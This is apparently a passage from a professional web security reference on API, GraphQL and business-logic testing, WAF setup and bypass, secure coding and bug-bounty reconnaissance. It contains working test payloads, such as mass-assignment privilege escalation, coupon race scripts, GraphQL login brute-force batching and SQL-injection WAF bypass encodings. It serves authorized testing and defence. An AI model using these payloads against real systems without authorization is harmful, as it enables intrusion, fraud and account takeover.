### Business Logic Vulnerabilities

**Price and Value Manipulation**
```
Test negative quantities:   {"product_id": 1, "quantity": -1}
Test zero price:            {"price": 0.00, "product_id": 1}
Test integer overflow:      {"quantity": 2147483648}
```

**Coupon Race Condition Testing**
```python
import asyncio, aiohttp

async def apply_coupon(session):
    return await session.post('/apply-coupon', json={"code": "SAVE50"})

async def race():
    async with aiohttp.ClientSession() as s:
        tasks = [apply_coupon(s) for _ in range(20)]
        return await asyncio.gather(*tasks)
```

**Workflow Bypass**
- Multi-step checkout: navigate directly to `/confirm-order` skipping payment step
- Password reset flow: access step 3 without completing steps 1-2
- Email verification: access post-verification features before verifying
- Test all state transitions: can step N be reached from step N-3 directly?

**Mass Assignment via Extra JSON Fields**
```json
POST /api/users/update
{
  "name": "John",
  "email": "john@example.com",
  "role": "admin",
  "verified": true,
  "credit_balance": 1000000
}
```

**Predictable Resource IDs**
- Sequential integer IDs: increment/decrement to access other records (classic IDOR)
- Test: create two accounts, compare IDs of created resources for patterns

---

### OWASP API Security Top 10 (2023)

**API1 Broken Object Level Authorization (BOLA)**
```bash
# Replace your ID with another user's ID in every endpoint
GET /api/v1/orders/1001   your order
GET /api/v1/orders/1002   other user (should return 403, not data)

# Automate with Burp Autorize:
# 1. Capture request with User A session
# 2. Set Autorize header to User B token
# 3. Replay all requests; flag 200 responses as potential BOLA
```

**API2 Broken Authentication**
```bash
# Test: remove Authorization header from authenticated requests
# Check OPTIONS/HEAD methods for auth bypass
curl -X OPTIONS https://api.target.com/v1/admin/users
```

**API3 Broken Object Property Level Authorization (BOPLA)**
```python
r = requests.put("/api/users/1", json={
    "name": "test",
    "internal_score": 999,
    "admin_notes": "injected"
})
# If unexpected fields are reflected or acted on -> BOPLA
```

**API4 Unrestricted Resource Consumption**
```bash
# GraphQL batching to bypass per-request rate limits
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{ user(id:1){email} }"},{"query":"{ user(id:2){email} }"}]'
```

**API5 Broken Function Level Authorization**
```bash
GET  /api/v1/admin/users
GET  /api/admin/users
GET  /api/v1/management/users
DELETE /api/v1/users/123
PUT  /api/v1/users/123  # test if allowed for regular users
```

**API6 Unrestricted Access to Sensitive Business Flows**
- Account creation: create bulk accounts (bot detection bypass)
- Purchasing: buy limited-quantity items faster than intended
- Content posting: spam via API without UI rate limiting

**API8 Security Misconfiguration**
```bash
# Check CORS on API
curl -H "Origin: https://attacker.com" https://api.target.com/v1/user/me -I
# Look for: Access-Control-Allow-Origin: https://attacker.com

# Check for debug/schema endpoints
GET /api/v1/debug
GET /api/v1/swagger.json
GET /api/v1/openapi.json
```

**API9 Improper Inventory Management**
```bash
# Enumerate API versions; older versions may lack security controls
curl https://api.target.com/v1/users
curl https://api.target.com/v2/users
curl https://api.target.com/beta/users
curl https://api.target.com/internal/users
```

**API10 Unsafe Consumption of APIs**
- Server trusts third-party API responses without validation
- Test: if you can influence third-party data (e.g., OAuth profile), inject payloads there

---

### GraphQL Security Testing

**Introspection Query (disable in production)**
```graphql
{
  __schema {
    types {
      name
      fields { name type { name } }
    }
  }
}
```

**Field Suggestion Abuse (schema disclosure without introspection)**
```graphql
{ usr { id } }
# Response: "Did you mean 'user'?" reveals schema
```

**Batching Attack (rate limit bypass)**
```graphql
{
  login1: login(username: "admin", password: "pass1") { token }
  login2: login(username: "admin", password: "pass2") { token }
  login3: login(username: "admin", password: "pass3") { token }
}
```

**Array-based batching**
```json
[
  {"query": "mutation { login(username: \"admin\", password: \"pass1\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"pass2\") { token } }"}
]
```

**CSRF via GET Mutations**
```
If mutations are allowed via GET:
https://api.target.com/graphql?query=mutation{deleteAccount(id:123)}
```

**Depth Limit Bypass (DoS potential)**
```graphql
{ user { friends { friends { friends { friends { id name } } } } } }
```

**GraphQL Tools**
```bash
# InQL Burp extension: automated introspection and testing
# GraphQL Voyager: visual schema exploration
# Clairvoyance: schema enumeration without introspection

curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
```

---
﻿## 8. WAF and Defense Technologies

### WAF Deployment Models

**Inline Reverse Proxy**
- All traffic routed through WAF before reaching origin; can block malicious requests in real-time
- Cloud WAFs: AWS WAF (CloudFront/ALB/API Gateway), Cloudflare WAF, Imperva, Akamai App and API Protector
- On-premises: ModSecurity (Apache/Nginx/IIS), NAXSI (Nginx)

**Out-of-Band Passive**
- Monitors copy of traffic; cannot block in real-time
- Used for detection, logging, compliance; lower performance impact

---

### ModSecurity CRS Configuration

**Basic Setup**
```apache
SecRuleEngine On

# Anomaly scoring mode (recommended over DetectionOnly)
SecDefaultAction "phase:1,log,auditlog,pass"
SecDefaultAction "phase:2,log,auditlog,pass"

# Paranoia level 1-4 (higher = more rules, more false positives)
# PL1: Low FP rate, less protection
# PL4: Very strict, significant tuning required
SecAction "id:900000,phase:1,pass,nolog,setvar:tx.paranoia_level=2"

# Anomaly scoring thresholds
SecAction "id:900110,phase:1,pass,nolog,setvar:tx.inbound_anomaly_score_threshold=5"
SecAction "id:900110,phase:1,pass,nolog,setvar:tx.outbound_anomaly_score_threshold=4"
```

**Exclusion Rules (Tuning)**
```apache
# Exclude specific rule for a URL path
SecRule REQUEST_URI "@beginsWith /api/legacy-endpoint" \
    "id:10001,phase:1,pass,nolog,ctl:ruleRemoveById=942100"

# Exclude parameter from SQL injection rules
SecRuleUpdateTargetById 942100 "!ARGS:search_query"

# Whitelist IP range
SecRule REMOTE_ADDR "@ipMatch 10.0.0.0/8" \
    "id:10002,phase:1,pass,nolog,ctl:ruleEngine=Off"
```

**Testing with go-ftw**
```bash
pip install ftw
go-ftw run -d /path/to/CRS/tests/regression/
```

---

### AWS WAF v2

**Key Managed Rule Groups**
| Rule Group | Protects Against |
|-----------|-----------------|
| `AWSManagedRulesCommonRuleSet` | OWASP Top 10 common attacks |
| `AWSManagedRulesSQLiRuleSet` | SQL injection patterns |
| `AWSManagedRulesKnownBadInputsRuleSet` | Log4Shell, Spring4Shell, Spring actuator |
| `AWSManagedRulesBotControlRuleSet` | Automated bots, scrapers |
| `AWSManagedRulesATPRuleSet` | Account takeover (credential stuffing) |

**Rate-Based Rule (JSON)**
```json
{
  "Name": "RateLimit-Login",
  "Priority": 10,
  "Action": {"Block": {}},
  "Statement": {
    "RateBasedStatement": {
      "Limit": 100,
      "AggregateKeyType": "IP",
      "ScopeDownStatement": {
        "ByteMatchStatement": {
          "FieldToMatch": {"UriPath": {}},
          "PositionalConstraint": "EXACTLY",
          "SearchString": "/login",
          "TextTransformations": [{"Priority": 0, "Type": "NONE"}]
        }
      }
    }
  }
}
```

**WAF Logging**
```bash
# Enable logging to CloudWatch Logs
aws wafv2 put-logging-configuration \
  --logging-configuration ResourceArn=<WAF_ARN>,LogDestinationConfigs=<CWL_ARN>

# Query WAF logs with CloudWatch Insights
fields @timestamp, httpRequest.uri, action, ruleGroupList.0.terminatingRule.ruleId
| filter action = "BLOCK"
| sort @timestamp desc
| limit 100
```

---

### Cloudflare WAF

**Configuration Layers**
- Managed Rulesets: OWASP Core Ruleset, Cloudflare Managed Ruleset
- Custom Rules: expression-based filtering (Firewall Rules language)
- Rate Limiting: per-IP, per-ASN, per-cookie, per-header
- Bot Management: JS challenge, Managed Challenge, Block based on bot score

**Custom Rule Expressions**
```
Block requests without User-Agent:
  (not http.request.headers["user-agent"] exists)

Rate limit login endpoint:
  (http.request.uri.path eq "/api/login") and (http.request.method eq "POST")

Challenge traffic from specific ASNs:
  (ip.geoip.asnum in {12345 67890})
```

---

### WAF Testing and Bypass (Authorized Testing Only)

**WAF Detection**
```bash
wafw00f https://target.com
wafw00f https://target.com -a  # test all WAF signatures
```

**Bypass Techniques for Authorized Testing**
```
Encoding bypasses:
  %27           URL encode apostrophe
  %2527         double URL encode
  &#x27;        HTML entity

Case variation:
  sElEcT * fRoM uSeRs

Comment insertion:
  SE/**/LECT * FR/**/OM users
  SELECT/**/ * /**/ FROM users

HTTP parameter pollution:
  ?id=1&id=2 UNION SELECT...

Chunked Transfer-Encoding:
  Transfer-Encoding: chunked
  (some WAFs do not reassemble chunks)
```

---

### CDN Security

**Security Benefits**
- HTTPS enforcement: redirect HTTP to HTTPS at edge
- DDoS protection: absorb volumetric attacks at anycast network
- Origin IP protection: validate traffic source is CDN; never expose origin IP directly
- Geo-blocking: restrict access by country/region at edge

**Origin IP Leakage Checks**
```bash
# Check historical DNS records via Shodan, censys.io, SecurityTrails
shodan search "Ssl.cert.subject.cn:target.com"

# Test direct IP access to confirm origin protection
curl -k --resolve target.com:443:<direct_ip> https://target.com/
```

---
﻿## 9. Secure Development Practices

### Secure Coding by Language

**Python Security Patterns**
```python
import secrets, hashlib, subprocess, psycopg2

# Parameterized queries prevent SQL injection
def get_user(conn, username: str):
    with conn.cursor() as cur:
        cur.execute("SELECT id, email FROM users WHERE username = %s", (username,))
        return cur.fetchone()

# Subprocess list args prevent command injection
def ping_host(hostname: str):
    result = subprocess.run(
        ["ping", "-c", "1", hostname],
        capture_output=True, text=True, timeout=5
    )
    return result.returncode == 0
# NEVER: subprocess.run(f"ping -c 1 {hostname}", shell=True)

# Secure random tokens
reset_token = secrets.token_urlsafe(32)   # URL-safe 256-bit token
session_id = secrets.token_hex(32)        # hex 256-bit token

# Argon2id password hashing (OWASP first choice)
from argon2 import PasswordHasher
ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)
hashed = ph.hash(password)
ph.verify(hashed, password)  # raises VerifyMismatchError if invalid

# PBKDF2 FIPS-compliant alternative
salt = secrets.token_bytes(32)
hashed = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 600000)
```

**Java Security Patterns**
```java
// PreparedStatement prevents SQL injection
public User getUser(Connection conn, String username) throws SQLException {
    String sql = "SELECT id, email FROM users WHERE username = ?";
    try (PreparedStatement stmt = conn.prepareStatement(sql)) {
        stmt.setString(1, username);
        ResultSet rs = stmt.executeQuery();
        if (rs.next()) {
            return new User(rs.getLong("id"), rs.getString("email"));
        }
    }
    return null;
}

// ESAPI output encoding
import org.owasp.esapi.ESAPI;
String safe = ESAPI.encoder().encodeForHTML(userInput);
String safeAttr = ESAPI.encoder().encodeForHTMLAttribute(userInput);
String safeJS = ESAPI.encoder().encodeForJavaScript(userInput);

// BCrypt password hashing (Spring Security)
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12);
String hashed = encoder.encode(password);
boolean matches = encoder.matches(rawPassword, hashed);
```

**Node.js Security Patterns**
```javascript
const express = require('express');
const helmet = require('helmet');
const app = express();

// Helmet.js security headers
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
    }
  },
  hsts: { maxAge: 31536000, includeSubDomains: true, preload: true }
}));

// express-validator input validation
const { body, validationResult } = require('express-validator');
app.post('/login', [
  body('email').isEmail().normalizeEmail(),
  body('password').isLength({ min: 8, max: 128 }).trim(),
], (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) return res.status(400).json({ errors: errors.array() });
});

// bcrypt password hashing
const bcrypt = require('bcrypt');
const hashed = await bcrypt.hash(password, 12);
const isValid = await bcrypt.compare(plaintext, hashed);

// JWT with proper options
const jwt = require('jsonwebtoken');
const token = jwt.sign({ userId: user.id }, process.env.JWT_SECRET, {
  algorithm: 'HS256',
  expiresIn: '15m',
  issuer: 'api.example.com',
  audience: 'web-app'
});
```

**PHP Security Patterns**
```php
// PDO prepared statements
function getUser(PDO $pdo, string $username): ?array {
    $stmt = $pdo->prepare("SELECT id, email FROM users WHERE username = :username");
    $stmt->execute(['username' => $username]);
    return $stmt->fetch(PDO::FETCH_ASSOC) ?: null;
}

// Input filtering
$email = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL);
$age = filter_input(INPUT_GET, 'age', FILTER_VALIDATE_INT, [
    'options' => ['min_range' => 1, 'max_range' => 150]
]);

// Password hashing
$hashed = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);
$isValid = password_verify($plaintext, $hashed);

// Output encoding
echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');
```

---

### Security Code Review Checklist

**Injection Sinks to Search For**
```bash
# Python SQL sinks
grep -rn "execute\|query\|prepare\|fetchall\|raw(" --include="*.py"

# Python command execution sinks
grep -rn "subprocess\.run.*shell=True\|os\.system\|eval\|exec(" --include="*.py"

# Python deserialization sinks
grep -rn "pickle\.loads\|yaml\.load\b\|marshal\.loads" --include="*.py"

# Java SQL sinks
grep -rn "createQuery\|nativeQuery\|executeQuery" --include="*.java"

# Java deserialization sinks
grep -rn "ObjectInputStream\|readObject\b" --include="*.java"

# PHP sinks
grep -rn "shell_exec\|exec\|system\|passthru\|popen" --include="*.php"
grep -rn "unserialize(" --include="*.php"
```

**Security Review Checklist**
- [ ] All database queries use parameterized statements (no string concatenation)
- [ ] Output HTML-encoded before rendering in templates
- [ ] Every protected endpoint has authentication and authorization check
- [ ] CSRF token present on all state-changing forms and AJAX calls
- [ ] No stack traces or internal error details exposed to users
- [ ] No secrets (API keys, passwords) committed to source code
- [ ] File uploads: validate type (magic bytes), size, store outside webroot
- [ ] Redirects: validate destination is within allowed domains
- [ ] XML parsing: external entities disabled
- [ ] Logging: sensitive data (passwords, tokens, PII) not logged

---

### Threat Modeling for Applications

**Data Flow Diagram Process**
1. Identify external entities (users, third-party APIs, admin interfaces)
2. Map data flows between components
3. Identify trust boundaries (internet to DMZ to internal, user to app to database)
4. Apply STRIDE to each component and data flow
5. Rate risks: OWASP Risk Rating = Likelihood x Impact

**OWASP ASVS Verification Framework**
| Level | Use Case |
|-------|---------|
| L1 (Opportunistic) | All software; automated testing sufficient |
| L2 (Standard) | Applications handling sensitive data; most commercial apps |
| L3 (Advanced) | High-value: banking, medical, critical infrastructure |

**Key ASVS Authentication Requirements**
- V2.1.1: Passwords minimum 12 characters
- V2.1.5: Users can change their password
- V2.1.9: No password composition rules that reduce entropy
- V2.1.12: Verify paste functionality works in password fields
- V2.3.1: System-generated initial passwords are random and minimum 6 characters

---
﻿## 10. Bug Bounty and Tool Reference

### Bug Bounty Methodology Full Workflow

**Phase 1 Asset Discovery**
```bash
# Subdomain enumeration (passive + active)
subfinder -d target.com -all -o subs_subfinder.txt
amass enum -passive -d target.com -o subs_amass_passive.txt
amass enum -active -brute -d target.com -o subs_amass_active.txt
assetfinder --subs-only target.com >> subs_all.txt

# Certificate transparency
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
    jq -r '.[].name_value' | sort -u >> subs_all.txt

# Resolve live hosts
cat subs_*.txt | sort -u | httpx -status-code -title -tech-detect \
    -follow-redirects -o live_hosts.txt -threads 50
```

**Phase 2 URL and Content Discovery**
```bash
# Historical URL collection
cat live_hosts.txt | waybackurls | tee wayback_urls.txt
cat live_hosts.txt | gau --threads 10 | tee gau_urls.txt
cat wayback_urls.txt gau_urls.txt | sort -u > all_urls.txt

# Extract interesting URLs
cat all_urls.txt | grep -E "\.js$" > js_files.txt
cat all_urls.txt | grep -E "\.(config|xml|yaml|env|bak|old|sql)$" > sensitive_files.txt
cat all_urls.txt | grep -E "\?(.*=)" > parameterized_urls.txt

# Directory bruteforce
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt \
    -u https://target.com/FUZZ -fc 403,404 -mc all \
    -recursion -recursion-depth 2 -o ffuf_dirs.json -of json

# Parameter discovery
arjun -u https://target.com/api/endpoint -m GET
```

**Phase 3 Automated Vulnerability Scanning**
```bash
# Nuclei CVE and misconfiguration scanning
nuclei -l live_hosts.txt -t cves/ -t exposures/ -t misconfigurations/ \
    -t technologies/ -o nuclei_results.txt -stats

nuclei -u https://target.com -t cves/ -t exposures/ -t misconfigurations/ \
    -t default-logins/ -t panels/ -rate-limit 10

# Web server scan
nikto -h https://target.com -ssl -output nikto_report.html -Format html

# TLS assessment
testssl.sh --full --jsonfile testssl_results.json https://target.com

# Mozilla Observatory
curl -s "https://http-observatory.security.mozilla.org/api/v1/analyze?host=target.com" | jq .
```

**Phase 4 JavaScript Analysis**
```bash
# Extract endpoints and secrets from JS files
cat js_files.txt | while read url; do
    python3 /opt/LinkFinder/linkfinder.py -i "$url" -o cli 2>/dev/null
    python3 /opt/SecretFinder/SecretFinder.py -i "$url" -o cli 2>/dev/null
done | sort -u > js_analysis.txt

# Grep for API key patterns in downloaded JS
grep -rE "(api[_-]?key|apikey|api_secret|aws_access|private_key|token|secret)" \
    js_files_dir/ --include="*.js" -l
```

**Phase 5 Manual Deep Testing**
- IDOR testing on all object references
- Authentication and session security testing
- Input validation on all parameters (injection, XSS)
- Business logic walkthrough of complete workflows
- Second-order injection testing across stored inputs
- Race condition testing on coupons, limited resources, transactions

---

### Complete Tool Reference

**Reconnaissance**
| Tool | Command | Purpose |
|------|---------|---------|
| amass | `amass enum -d target.com` | Subdomain enumeration |
| subfinder | `subfinder -d target.com` | Passive subdomain enum |
| httpx | `httpx -l domains.txt -status-code -title -tech-detect` | HTTP probing |
| waybackurls | `waybackurls target.com` | Historical URLs from Wayback |
| gau | `gau target.com` | All known URLs from multiple sources |
| shodan | `shodan search hostname:target.com` | Internet-wide scanning |
| crt.sh | `curl crt.sh/?q=%.target.com&output=json` | CT log search |

**Scanning**
| Tool | Command | Purpose |
|------|---------|---------|
| nuclei | `nuclei -u target -t cves/ -t exposures/` | Template-based scanning |
| nikto | `nikto -h https://target.com -ssl` | Web server scanning |
| testssl.sh | `testssl.sh --full https://target.com` | TLS assessment |
| nmap | `nmap -sV -sC -p- target.com` | Port/service scanning |
| feroxbuster | `feroxbuster -u https://target.com -w wordlist.txt` | Content discovery |

**Fuzzing**
```bash
# Directory and file discovery
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt \
     -u https://target.com/FUZZ -fc 403,404

gobuster dir -u https://target.com \
     -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt \
     -x php,html,txt,bak,old -t 50

feroxbuster -u https://target.com \
    -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt \
    --depth 3 --filter-status 403,404

# Virtual host fuzzing
ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u https://target.com -H "Host: FUZZ.target.com" -fs <baseline>
```

**Exploitation Tools**
| Tool | Use Case |
|------|---------|
| Burp Suite Pro | Full web app pentest platform |
| OWASP ZAP | Free alternative to Burp |
| sqlmap | SQL injection automation |
| XSStrike | XSS detection and exploitation |
| jwt_tool | JWT analysis and exploitation |
| Arjun | HTTP parameter discovery |
| ParamSpider | Parameter mining from web archives |
| hakrawler | Fast web crawler for endpoint discovery |
| ffuf | Fast web fuzzer for content and parameter discovery |
| nuclei | Template-based vulnerability scanner |

---

### Bug Bounty Platforms

| Platform | URL | Notes |
|---------|-----|-------|
| HackerOne | hackerone.com | Largest platform; public and private programs |
| Bugcrowd | bugcrowd.com | Programs and PTaaS offerings |
| Intigriti | intigriti.com | Strong EU presence |
| YesWeHack | yeswehack.com | European focus |
| Synack | synack.com | Vetted researcher network |
| Open Bug Bounty | openbugbounty.org | Responsible disclosure |
| CISA | cisa.gov | US Federal coordinated vulnerability disclosure |

---

### Practice Labs and Learning Resources

**Intentionally Vulnerable Applications**
```bash
# OWASP Juice Shop (Docker)
docker run --rm -p 3000:3000 bkimminich/juice-shop
# Access: http://localhost:3000

# DVWA Damn Vulnerable Web Application
docker run --rm -p 80:80 vulnerables/web-dvwa

# WebGoat
docker run --rm -p 8080:8080 webgoat/goat-and-wolf

# HackTheBox Web challenges: https://www.hackthebox.com
# TryHackMe Web Fundamentals path: https://tryhackme.com
```

**Essential Resources**
```
PortSwigger Web Security Academy (free):
  https://portswigger.net/web-security
  Labs covering all OWASP categories with hands-on practice

OWASP Testing Guide v4.2:
  https://owasp.org/www-project-web-security-testing-guide/

OWASP ASVS Application Security Verification Standard:
  https://owasp.org/www-project-application-security-verification-standard/

SecLists wordlist collection:
  git clone https://github.com/danielmiessler/SecLists /opt/SecLists

PayloadsAllTheThings:
  git clone https://github.com/swisskyrepo/PayloadsAllTheThings /opt/PayloadsAllTheThings

PortSwigger Research Blog:
  https://portswigger.net/research
```

---

*Last updated: 2026-05-06 | Classification: Professional Security Reference*
*For authorized security testing and defensive use only. Always obtain proper written authorization before testing.*
